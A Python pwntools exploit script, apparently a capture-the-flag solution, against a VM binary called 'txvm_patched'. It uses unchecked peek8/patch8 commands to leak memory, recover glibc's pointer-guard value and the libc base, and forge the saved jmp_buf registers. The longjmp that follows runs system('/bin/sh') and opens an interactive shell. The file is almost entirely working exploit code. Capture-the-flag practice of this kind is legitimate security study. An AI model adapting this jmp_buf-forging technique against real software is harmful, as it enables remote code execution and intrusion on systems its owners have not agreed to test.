#!/usr/bin/env python3

from pwn import *

e = ELF("./txvm_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = e

# context.terminal =  ['tmux', 'new-window', '-n', 'GDB']
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]


context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *session+0x5a
c
"""

if args.GDB:
	r = gdb.debug(e.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
	r = process(e.path)
elif args.DOCKER:
	r = remote("localhost", DOCKER_PORT)
else:
	r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)



S = e.symbols["S"]
JMPBUF = S + 0x8
VM_MAIN = S + 0x158

OFF_JB_START = JMPBUF - VM_MAIN
OFF_JB_RBP   = (JMPBUF + 0x08) - VM_MAIN
OFF_JB_R14   = (JMPBUF + 0x20) - VM_MAIN
OFF_JB_RSP   = (JMPBUF + 0x30) - VM_MAIN
OFF_JB_RIP   = (JMPBUF + 0x38) - VM_MAIN
OFF_PUTS_GOT = e.got["puts"] - VM_MAIN

MASK = (1 << 64) - 1

def rol(x, n):
    return ((x << n) & MASK) | (x >> (64 - n))


def ror(x, n):
    return ((x >> n) | (x << (64 - n))) & MASK


def mangle_ptr(ptr, guard):
    return rol((ptr ^ guard) & MASK, 17)


def demangle_ptr(ptr, guard):
    return ror(ptr, 17) ^ guard


def cmd(s):
    s = s.encode()

    sl(s)
    return ru("vm>")


def peek8(off):
    sl(f"peek8 r0, {off}".encode())

    line = rl().strip()
    ru("vm>")

    try:
        return int(line, 16)
    except ValueError:
        log.failure(f"bad peek8 output: {line!r}")
        raise


def poke8(off, val):
    cmd(f"patch8 r0, {off} = 0x{val & 0xff:02x}")


def leak_qword(name, off):
    value = u64(bytes(peek8(off + i) for i in range(8)))
    log.success(f"{name}: {value:#x}")
    return value


def write(name, off, value):
    log.info(f"write {name}: {value:#x}")
    for i, b in enumerate(p64(value)):
        poke8(off + i, b)

"""
no idx check on peek/poke -> can leak and write as i want


"""

def main():
	ru(b'vm>')
	rbp_mangled = leak_qword("jb.rbp_mangled", OFF_JB_RBP)
	saved_r14   = leak_qword("jb.r14", OFF_JB_R14)
	rsp_mangled = leak_qword("jb.rsp_mangled", OFF_JB_RSP)
	puts_leak   = leak_qword("puts@got", OFF_PUTS_GOT)

	real_rbp = saved_r14 + 0xa0
	guard = ror(rbp_mangled, 17) ^ real_rbp
	saved_rsp = demangle_ptr(rsp_mangled, guard)
	libc.address = puts_leak - libc.sym["puts"]

	log.success(f"real_rbp      = {real_rbp:#x}")
	log.success(f"pointer_guard = {guard:#x}")
	log.success(f"saved_rsp     = {saved_rsp:#x}")
	log.success(f"libc base     = {libc.address:#x}")
	log.success(f"system        = {libc.sym['system']:#x}")

	write("env string", OFF_JB_START, u64(b"/bin/sh\x00"))
	write("jb.rsp", OFF_JB_RSP, mangle_ptr(saved_rsp + 8, guard))
	write("jb.rip", OFF_JB_RIP, mangle_ptr(libc.sym["system"], guard))

	sl("begin transaction")
	ru("vm>")
	log.info("trigger longjmp -> system('/bin/sh')")
	r.sendline(b"peek8 r0, 8")
	r.interactive()


if __name__ == "__main__":
	main()
